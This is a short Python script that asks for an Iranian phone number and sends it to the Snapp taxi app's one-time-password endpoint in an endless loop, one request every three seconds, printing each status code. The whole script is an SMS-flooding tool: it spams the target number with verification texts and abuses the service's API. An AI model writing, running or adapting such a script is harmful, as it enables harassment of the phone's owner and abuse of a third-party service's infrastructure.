import requests 
import time

phone = input("Enter your phone number : +98")

Url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp/"
mydata = {"cellphone":"+98"+phone}


while True :
    respone = (requests.post(Url,data=mydata))
    print(respone.status_code)
    time.sleep(3)
